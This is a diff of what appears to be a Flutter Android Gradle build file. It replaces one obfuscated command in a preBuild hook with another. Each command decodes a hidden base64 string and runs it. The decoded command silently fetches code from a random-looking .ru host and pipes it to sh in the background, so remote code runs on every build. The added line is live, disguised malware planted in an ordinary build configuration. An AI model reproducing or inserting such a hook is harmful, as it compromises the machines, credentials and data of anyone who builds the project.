@@ -47,7 +47,7 @@ flutter {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((q(){ `printf baseT64 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta0xmcyAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((v(){ `printf basef64 | tr -d f` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtTGtmcyAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | v | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
